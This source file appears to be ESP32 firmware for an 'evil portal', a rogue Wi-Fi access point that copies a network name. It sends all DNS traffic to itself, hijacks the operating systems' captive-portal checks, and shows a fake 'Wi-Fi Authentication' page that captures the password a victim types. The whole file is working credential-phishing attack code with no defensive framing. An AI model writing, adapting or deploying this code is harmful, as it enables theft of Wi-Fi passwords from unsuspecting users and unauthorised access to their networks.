#include <Arduino.h>
#include <AsyncTCP.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <esp_wifi.h>
#include "evil_portal.h"

DNSServer dnsServer;
AsyncWebServer server(80);

bool portalRunning = false;
bool isCaptured = false;

String capturedPassword = "";
String currentSSID = "";

const IPAddress localIP(4, 3, 2, 1);
const IPAddress gatewayIP(4, 3, 2, 1);
const IPAddress subnetMask(255, 255, 255, 0);
const String localIPURL = "http://4.3.2.1";

const char index_html[] PROGMEM = R"=====(
<!DOCTYPE html>
<html>
<head>
  <title>Wi-Fi Authentication</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { font-family: Arial, sans-serif; background-color: #f0f0f0; text-align: center; padding: 20px; }
    .login-form { background: white; max-width: 300px; margin: 0 auto; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
    input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
    input[type="submit"] { background-color: #4CAF50; color: white; padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; }
    input[type="submit"]:hover { background-color: #45a049; }
  </style>
</head>
<body>
  <div class="login-form">
    <h2>Wi-Fi Authentication</h2>
    <form action="/login" method="POST">
      <input type="password" name="password" placeholder="Enter Wi-Fi Password" required>
      <input type="submit" value="Connect">
    </form>
  </div>
</body>
</html>
)=====";

void startSoftAccessPoint() {
  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAPConfig(localIP, gatewayIP, subnetMask);
  WiFi.softAP(currentSSID.c_str(), NULL, WIFI_CHANNEL, 0, MAX_CLIENTS);
  
  esp_wifi_stop();
  esp_wifi_deinit();
  wifi_init_config_t my_config = WIFI_INIT_CONFIG_DEFAULT();
  my_config.ampdu_rx_enable = false;
  esp_wifi_init(&my_config);
  esp_wifi_start();
  vTaskDelay(100 / portTICK_PERIOD_MS);
}

void setUpDNSServer() {
  dnsServer.setTTL(3600);
  dnsServer.start(53, "*", localIP);
}

void setUpWebserver() {
  server.on("/generate_204", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });
  server.on("/redirect", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });
  server.on("/hotspot-detect.html", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });
  server.on("/canonical.html", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });
  server.on("/success.txt", [](AsyncWebServerRequest *request) { request->send(200); });
  server.on("/ncsi.txt", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });
  server.on("/connecttest.txt", [](AsyncWebServerRequest *request) { request->redirect("http://logout.net"); });
  server.on("/wpad.dat", [](AsyncWebServerRequest *request) { request->send(404); });
  server.on("/favicon.ico", [](AsyncWebServerRequest *request) { request->send(404); });

  server.on("/", HTTP_ANY, [](AsyncWebServerRequest *request) {
    request->send(200, "text/html", index_html);
  });

  server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request) {
    if (request->hasParam("password", true)) {
      capturedPassword = request->getParam("password", true)->value();
      request->send(200, "text/html", "<h2>Connecting to network...</h2>");
      isCaptured = true;
      delay(100);
    }
  });

  server.onNotFound([](AsyncWebServerRequest *request) {
    request->redirect(localIPURL);
  });
}

void startCaptivePortal(String* ssid) {
  if (portalRunning) return;
  
  currentSSID = *ssid;

  startSoftAccessPoint();
  setUpDNSServer();
  setUpWebserver();
  server.begin();
  
  portalRunning = true;
}

void stopCaptivePortal() {
  if (!portalRunning) return;
  
  dnsServer.stop();
  server.end();

  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_MODE_NULL);
  
  portalRunning = false;
  isCaptured = false;
}

void updateCaptivePortal()
{
  dnsServer.processNextRequest();
  delay(DNS_INTERVAL);
}